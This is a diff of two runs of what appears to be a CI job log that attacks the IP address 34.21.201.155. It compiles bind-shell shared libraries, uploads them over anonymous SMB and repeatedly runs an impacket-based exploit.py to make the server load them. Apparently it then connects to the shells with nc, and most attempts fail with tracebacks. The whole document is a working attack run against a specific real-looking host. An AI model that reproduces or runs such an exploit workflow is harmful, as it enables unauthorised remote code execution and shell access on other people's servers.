@@ -1,5 +1,5 @@
 + date -u
-Sun Jul  5 15:10:15 UTC 2026
+Sun Jul  5 15:13:28 UTC 2026
 + echo 'Target: 34.21.201.155'
 Target: 34.21.201.155
 + nc -vz -w 8 34.21.201.155 445
@@ -14,42 +14,42 @@ SMB1 disabled -- no workgroup available
 + cat
 + gcc -shared -fPIC -DBIND_PORT=4444 -o libspg4444.so bindshell-samba.c
 + gcc -shared -fPIC -DBIND_PORT=4445 -o libspg4445.so bindshell-samba.c
-+ smbclient //34.21.201.155/share -N -c 'put libspg4444.so libspg4444.so; put libspg4445.so libspg4445.so; ls'
-putting file libspg4444.so as \libspg4444.so (19.5 kb/s) (average 19.5 kb/s)
-putting file libspg4445.so as \libspg4445.so (26.0 kb/s) (average 22.3 kb/s)
-  .                                   D        0  Sun Jul  5 15:10:01 2026
++ smbclient //34.21.201.155/share -N '--option=client min protocol=NT1' '--option=client max protocol=NT1' -c 'put libspg4444.so libspg4444.so; put libspg4445.so libspg4445.so; ls'
+putting file libspg4444.so as \libspg4444.so (18.2 kb/s) (average 18.2 kb/s)
+putting file libspg4445.so as \libspg4445.so (24.2 kb/s) (average 20.8 kb/s)
+  .                                   D        0  Sun Jul  5 15:12:01 2026
   ..                                  D        0  Sun Jul  5 14:40:33 2026
-  libspg4444.so                       A    16312  Sun Jul  5 15:10:20 2026
-  libspg4445.so                       A    16312  Sun Jul  5 15:10:20 2026
+  libspg4444.so                       A    16416  Sun Jul  5 15:13:33 2026
+  libspg4445.so                       A    16416  Sun Jul  5 15:13:34 2026
 
-		10088732 blocks of size 1024. 6321220 blocks available
-+ smbclient //34.21.201.155/mnt -N -c 'put libspg4444.so libspg4444.so; put libspg4445.so libspg4445.so; ls'
+		10088732 blocks of size 1024. 6236604 blocks available
++ smbclient //34.21.201.155/mnt -N '--option=client min protocol=NT1' '--option=client max protocol=NT1' -c 'put libspg4444.so libspg4444.so; put libspg4445.so libspg4445.so; ls'
 NT_STATUS_ACCESS_DENIED opening remote file \libspg4444.so
 NT_STATUS_ACCESS_DENIED opening remote file \libspg4445.so
   .                                   D        0  Wed May 10 16:23:10 2017
   ..                                  D        0  Sun Jul  5 14:40:33 2026
 
-		10088732 blocks of size 1024. 6321220 blocks available
+		10088732 blocks of size 1024. 6236604 blocks available
 + for n in 1 2 3
-+ for base in /tmp /mnt
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
 + echo 'Trigger round 1 /tmp/libspg4444.so'
 Trigger round 1 /tmp/libspg4444.so
 + python3 exploit.py -t 34.21.201.155 -m /tmp/libspg4444.so
 Traceback (most recent call last):
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 550, in openFile
-    return self._SMBConnection.create(treeId, pathName, desiredAccess, shareMode, creationOption,
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3.py", line 1320, in create
-    if ans.isValidAnswer(STATUS_SUCCESS):
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3structs.py", line 466, in isValidAnswer
-    raise smb3.SessionError(self['Status'], self)
-impacket.smb3.SessionError: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 
 During handling of the above exception, another exception occurred:
 
 Traceback (most recent call last):
-  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 9, in <module>
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
     dce.connect()
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
     return self._transport.connect()
@@ -57,28 +57,29 @@ Traceback (most recent call last):
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
     self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 554, in openFile
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
     raise SessionError(e.get_error_code(), e.get_error_packet())
 impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 + true
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
 + echo 'Trigger round 1 /tmp/libspg4445.so'
 Trigger round 1 /tmp/libspg4445.so
 + python3 exploit.py -t 34.21.201.155 -m /tmp/libspg4445.so
 Traceback (most recent call last):
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 550, in openFile
-    return self._SMBConnection.create(treeId, pathName, desiredAccess, shareMode, creationOption,
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3.py", line 1320, in create
-    if ans.isValidAnswer(STATUS_SUCCESS):
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3structs.py", line 466, in isValidAnswer
-    raise smb3.SessionError(self['Status'], self)
-impacket.smb3.SessionError: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 
 During handling of the above exception, another exception occurred:
 
 Traceback (most recent call last):
-  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 9, in <module>
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
     dce.connect()
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
     return self._transport.connect()
@@ -86,29 +87,29 @@ Traceback (most recent call last):
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
     self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 554, in openFile
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
     raise SessionError(e.get_error_code(), e.get_error_packet())
 impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 + true
-+ for base in /tmp /mnt
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
 + echo 'Trigger round 1 /mnt/libspg4444.so'
 Trigger round 1 /mnt/libspg4444.so
 + python3 exploit.py -t 34.21.201.155 -m /mnt/libspg4444.so
 Traceback (most recent call last):
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 550, in openFile
-    return self._SMBConnection.create(treeId, pathName, desiredAccess, shareMode, creationOption,
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3.py", line 1320, in create
-    if ans.isValidAnswer(STATUS_SUCCESS):
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3structs.py", line 466, in isValidAnswer
-    raise smb3.SessionError(self['Status'], self)
-impacket.smb3.SessionError: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 
 During handling of the above exception, another exception occurred:
 
 Traceback (most recent call last):
-  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 9, in <module>
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
     dce.connect()
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
     return self._transport.connect()
@@ -116,28 +117,29 @@ Traceback (most recent call last):
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
     self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 554, in openFile
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
     raise SessionError(e.get_error_code(), e.get_error_packet())
 impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 + true
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
 + echo 'Trigger round 1 /mnt/libspg4445.so'
 Trigger round 1 /mnt/libspg4445.so
 + python3 exploit.py -t 34.21.201.155 -m /mnt/libspg4445.so
 Traceback (most recent call last):
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 550, in openFile
-    return self._SMBConnection.create(treeId, pathName, desiredAccess, shareMode, creationOption,
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3.py", line 1320, in create
-    if ans.isValidAnswer(STATUS_SUCCESS):
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3structs.py", line 466, in isValidAnswer
-    raise smb3.SessionError(self['Status'], self)
-impacket.smb3.SessionError: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 
 During handling of the above exception, another exception occurred:
 
 Traceback (most recent call last):
-  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 9, in <module>
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
     dce.connect()
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
     return self._transport.connect()
@@ -145,7 +147,67 @@ Traceback (most recent call last):
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
     self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 554, in openFile
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
+    raise SessionError(e.get_error_code(), e.get_error_packet())
+impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
++ true
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
++ echo 'Trigger round 1 tmp/libspg4444.so'
+Trigger round 1 tmp/libspg4444.so
++ python3 exploit.py -t 34.21.201.155 -m tmp/libspg4444.so
+Traceback (most recent call last):
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
+    dce.connect()
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
+    return self._transport.connect()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
+    self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
+                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
+    raise SessionError(e.get_error_code(), e.get_error_packet())
+impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
++ true
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
++ echo 'Trigger round 1 tmp/libspg4445.so'
+Trigger round 1 tmp/libspg4445.so
++ python3 exploit.py -t 34.21.201.155 -m tmp/libspg4445.so
+Traceback (most recent call last):
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
+    dce.connect()
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
+    return self._transport.connect()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
+    self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
+                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
     raise SessionError(e.get_error_code(), e.get_error_packet())
 impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 + true
@@ -169,25 +231,25 @@ Connect bind shell 6699
 + nc -w 8 34.21.201.155 6699
 + true
 + for n in 1 2 3
-+ for base in /tmp /mnt
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
 + echo 'Trigger round 2 /tmp/libspg4444.so'
 Trigger round 2 /tmp/libspg4444.so
 + python3 exploit.py -t 34.21.201.155 -m /tmp/libspg4444.so
 Traceback (most recent call last):
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 550, in openFile
-    return self._SMBConnection.create(treeId, pathName, desiredAccess, shareMode, creationOption,
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3.py", line 1320, in create
-    if ans.isValidAnswer(STATUS_SUCCESS):
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3structs.py", line 466, in isValidAnswer
-    raise smb3.SessionError(self['Status'], self)
-impacket.smb3.SessionError: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 
 During handling of the above exception, another exception occurred:
 
 Traceback (most recent call last):
-  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 9, in <module>
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
     dce.connect()
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
     return self._transport.connect()
@@ -195,28 +257,29 @@ Traceback (most recent call last):
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
     self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 554, in openFile
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
     raise SessionError(e.get_error_code(), e.get_error_packet())
 impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 + true
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
 + echo 'Trigger round 2 /tmp/libspg4445.so'
 Trigger round 2 /tmp/libspg4445.so
 + python3 exploit.py -t 34.21.201.155 -m /tmp/libspg4445.so
 Traceback (most recent call last):
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 550, in openFile
-    return self._SMBConnection.create(treeId, pathName, desiredAccess, shareMode, creationOption,
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3.py", line 1320, in create
-    if ans.isValidAnswer(STATUS_SUCCESS):
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3structs.py", line 466, in isValidAnswer
-    raise smb3.SessionError(self['Status'], self)
-impacket.smb3.SessionError: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 
 During handling of the above exception, another exception occurred:
 
 Traceback (most recent call last):
-  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 9, in <module>
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
     dce.connect()
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
     return self._transport.connect()
@@ -224,29 +287,29 @@ Traceback (most recent call last):
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
     self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 554, in openFile
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
     raise SessionError(e.get_error_code(), e.get_error_packet())
 impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 + true
-+ for base in /tmp /mnt
++ for module in /tmp/libspg4444.so /tmp/libspg4445.so /mnt/libspg4444.so /mnt/libspg4445.so tmp/libspg4444.so tmp/libspg4445.so
 + echo 'Trigger round 2 /mnt/libspg4444.so'
 Trigger round 2 /mnt/libspg4444.so
 + python3 exploit.py -t 34.21.201.155 -m /mnt/libspg4444.so
 Traceback (most recent call last):
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 550, in openFile
-    return self._SMBConnection.create(treeId, pathName, desiredAccess, shareMode, creationOption,
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3.py", line 1320, in create
-    if ans.isValidAnswer(STATUS_SUCCESS):
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb3structs.py", line 466, in isValidAnswer
-    raise smb3.SessionError(self['Status'], self)
-impacket.smb3.SessionError: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 545, in openFile
+    return self._SMBConnection.nt_create_andx(treeId, pathName, cmd = ntCreate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 4220, in nt_create_andx
+    if smb.isValidAnswer(SMB.SMB_COM_NT_CREATE_ANDX):
+       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smb.py", line 1047, in isValidAnswer
+    raise SessionError("SMB Library Error", self['ErrorClass'] + (self['_reserved'] << 8), self['ErrorCode'], self['Flags2'] & SMB.FLAGS2_NT_STATUS, self)
+impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
 
 During handling of the above exception, another exception occurred:
 
 Traceback (most recent call last):
-  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 9, in <module>
+  File "/home/runner/work/direksethi-profile/direksethi-profile/exploit.py", line 14, in <module>
     dce.connect()
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
     return self._transport.connect()
@@ -254,28 +317,29 @@ Traceback (most recent call last):
   File "/home/runner/.local/lib/python3.12/site-packages/impacket/dcerpc/v5/transport.py", line 525, in connect
     self.__handle = self.__smb_connection.openFile(self.__tid, self.__filename)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 554, in openFile
+  File "/home/runner/.local/lib/python3.12/site-packages/impacket/smbconnection.py", line 547, in openFile
     raise SessionError(e.get_error_code(), e.get_error_packet())
